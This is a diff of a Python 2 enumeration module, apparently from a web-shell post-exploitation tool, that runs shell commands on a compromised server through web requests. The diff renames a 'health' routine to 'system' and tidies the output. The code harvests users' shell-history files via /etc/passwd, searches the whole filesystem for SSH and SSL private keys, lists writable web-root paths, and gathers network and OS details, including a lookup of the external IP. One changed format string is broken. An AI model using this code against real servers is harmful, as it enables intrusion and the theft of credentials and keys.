@@ -7,14 +7,14 @@ class Enumerate(object):
     def list(self):
         print '\n[i] Usage: @enum [module]'
         print '[i] Modules:'
-        print '[i] \thealth    \t\tGeneral infomation about the system'
         print '[i] \thistory   \t\tList \'intressing\' (~/.*-history files)'
         print '[i] \tip        \t\tGeneral networking infomation about the system'
         print '[i] \tkeys      \t\tList private SSH & SSL keys/certs'
         print '[i] \tos        \t\tGeneral operating system infomation'
+        print '[i] \tsystem    \t\tGeneral infomation about the system'
         print '[i] \twritables\t\tList writable paths within the document\'s root directory'
-
-    def health(self):
+        
+    def system(self):
         cmd = 'input=`uptime` && if [[ \'$input\' == *day* ]] ; then echo $input | awk \'{print $3 ":" $5}\' | tr -d "," | awk -F ":" \'{print $1 " days, " $2 " hours and " $3 " minutes"}\'; else echo $input | awk \'{print $3}\' | tr -d "," | awk -F ":" \'{print $1 " hours and " $2 " minutes"}\'; fi;'
         cmd += "awk '{print ($1/(60*60*24))/($2/(60*60*24))*100 \"%\"}' /proc/uptime;"
         cmd += "w -h | wc -l;"
@@ -27,25 +27,25 @@ class Enumerate(object):
         cmd += "awk '{split($4,a,\"/\"); print a[1];}' /proc/loadavg;"
         cmd += "awk '{split($4,a,\"/\"); print a[2];}' /proc/loadavg;"
 
-        health = make_request.get_page_source(cmd)
+        system = make_request.get_page_source(cmd)
 
-        print '\n{0}[+] Uptime: {1}{2}'.format(Colors.GREEN, health[0], Colors.END)
-        print '{0}[+] Idletime: {1}{2}'.format(Colors.GREEN, health[1], Colors.END)
-        print '{0}[+] Users Logged in: {1}{2}'.format(Colors.GREEN, health[2], Colors.END)
-        print '{0}[+] Total Users: {1}{2}'.format(Colors.GREEN, health[3], Colors.END)
-        print '{0}[+] Total Groups: {1}{2}'.format(Colors.GREEN, health[4], Colors.END)
-        print '{0}[+] CPU Load (1, 5, 15 mins): {1}{2}'.format(Colors.GREEN, health[5], Colors.END)
-        print '{0}[+] Memory Load (Used %): {1}{2}'.format(Colors.GREEN, health[6], Colors.END)
-        print '{0}[+] Established TCP Connections: {1}{2}'.format(Colors.GREEN, health[7], Colors.END)
-        print '{0}[+] Listening TCP Services: {1}{2}'.format(Colors.GREEN, health[8], Colors.END)
-        print '{0}[+] User Processors: {1}{2}'.format(Colors.GREEN, health[9], Colors.END)
-        print '{0}[+] Total Processor: {1}{2}'.format(Colors.GREEN, health[10], Colors.END)
+        print '\n{0}[+] Uptime: {1}{2}'.format(Colors.GREEN, system[0], Colors.END)
+        print '{0}[+] Idletime: {1}{2}'.format(Colors.GREEN, system[1], Colors.END)
+        print '{0}[+] Users Logged in: {1}{2}'.format(Colors.GREEN, system[2], Colors.END)
+        print '{0}[+] Total Users: {1}{2}'.format(Colors.GREEN, system[3], Colors.END)
+        print '{0}[+] Total Groups: {1}{2}'.format(Colors.GREEN, system[4], Colors.END)
+        print '{0}[+] CPU Load (1, 5, 15 mins): {1}{2}'.format(Colors.GREEN, system[5], Colors.END)
+        print '{0}[+] Memory Load (Used %): {1}{2}'.format(Colors.GREEN, system[6], Colors.END)
+        print '{0}[+] Established TCP Connections: {1}{2}'.format(Colors.GREEN, system[7], Colors.END)
+        print '{0}[+] Listening TCP Services: {1}{2}'.format(Colors.GREEN, system[8], Colors.END)
+        print '{0}[+] User Processors: {1}{2}'.format(Colors.GREEN, system[9], Colors.END)
+        print '{0}[+] Total Processor: {1}{2}'.format(Colors.GREEN, system[10], Colors.END)
 
     def ip(self):
         cmd = "ip addr show | grep inet | awk '{printf \", \" $2}' | sed 's/^, *//' && echo;"
         cmd += "curl http://ifconfig.me/ip;"
         cmd += "cat /etc/resolv.conf | grep nameserver | awk '{printf \", \" $2}' | sed 's/^, *//' && echo;"
-        cmd += "/sbin/route -n | awk '{print $2}' | grep -v 0.0.0.0 | head -n 1;"
+        cmd += "/sbin/route -n | awk '{print $2}' | grep -v 0.0.0.0 | grep -v IP | grep -v Gateway | head -n 1;"
         #grep -q "BOOTPROTO=dhcp" /etc/sysconfig/network-scripts/ifcfg-eth0 2>/dev/null
         #grep -q "inet dhcp" /etc/network/interfaces 2>/dev/null
         cmd += 'dhcp_ip=`grep dhcp-server /var/lib/dhcp*/dhclient.* 2>/dev/null | uniq | awk \'{print $4}\' | tr -d ";"`; if [ $dhcp_ip ] ; then echo "Yes ($dhcp_ip)"; else echo "No"; fi;'
@@ -62,9 +62,9 @@ class Enumerate(object):
         cmd = "hostname;"
         cmd += "uname -a;"
         #cmd += "grep DISTRIB_DESCRIPTION /etc/*-release | head -n 1;"
-        cmd += "cat /etc/*-release | head -n 1;"
+        cmd += "cat /etc/*-release | head -n 1 | sed 's/DISTRIB_ID=//';"
         cmd += "date;"
-        cmd += "zdump UTC;"
+        cmd += "zdump UTC | sed 's/UTC  //';"
         #cmd += "python -c 'import locale; print locale.getdefaultlocale()[0];';"
         cmd += "echo $LANG;"
 
@@ -86,7 +86,7 @@ class Enumerate(object):
                 print '{0:2d}- {1}'.format(c, path)
                 c += 1
         else:
-            print '\n{0}[!]Didn\'t find any SSL certs{1}'.format(Colors.RED, Colors.END)
+            print '\n{0}[!] Didn\'t find any SSL certs{1}'.format(Colors.RED, Colors.END)
 
         cmd = "find / -type f -print0 | xargs -0 -I '{}' bash -c 'openssl x509 -in {} -noout > /dev/null 2>&1; [[ $? == '0' ]] && echo \"{}\"'"
         self.sshpub = make_request.get_page_source(cmd)
@@ -96,7 +96,7 @@ class Enumerate(object):
                 print '{0:2d}- {1}'.format(c, path)
                 c += 1
         else:
-            print '\n{0}[!]Didn\'t find any public SSH keys{1}'.format(Colors.RED, Colors.END)
+            print '\n{0}[!] Didn\'t find any public SSH keys{1}'.format(Colors.RED, Colors.END)
 
         # Private keys
         #find / -type f -exec bash -c 'ssh-keygen -yf {} >/dev/null 2>&1' \; -exec bash -c 'echo {}' \;        #grep -r "SSH PRIVATE KEY FILE FORMAT" /{etc,home,root} 2> /dev/null | wc -l    # find / -name "*host_key*"
@@ -108,10 +108,10 @@ class Enumerate(object):
         if self.writables:
             c = 1
             for path in self.writables:
-                print '{0}{1:2d{2}{3}'.format(Colors.GREEN, c, path, Colors.END)
+                print '{0}{1:2d)- {2}{3}'.format(Colors.GREEN, c, path, Colors.END)
                 c += 1
         else:
-            print '\n{0}[!]Didn\'t find any wriable directories{1}'.format(Colors.RED, Colors.END)
+            print '\n{0}[!] Didn\'t find any wriable directories{1}'.format(Colors.RED, Colors.END)
 
     def history(self):
         cmd = 'for i in $(cut -d: -f6 /etc/passwd | sort | uniq); do [ -f $i/.bash_history ] && echo "bash_history: $i"; [ -f $i/.nano_history ] && echo "nano_history: $i"; [ -f $i/.atftp_history ] && echo "atftp_history: $i"; [ -f $i/.mysql_history ] && echo "mysql_history: $i"; [ -f $i/.php_history ] && echo "php_history: $i";done'
@@ -122,6 +122,6 @@ class Enumerate(object):
                 print '{0:2d}- {1}'.format(c, path)
                 c += 1
         else:
-            print '\n{0}[!]Didn\'t find any \'history\' files{1}'.format(Colors.RED, Colors.END)
+            print '\n{0}[!] Didn\'t find any \'history\' files{1}'.format(Colors.RED, Colors.END)
 
 enumerate = Enumerate()
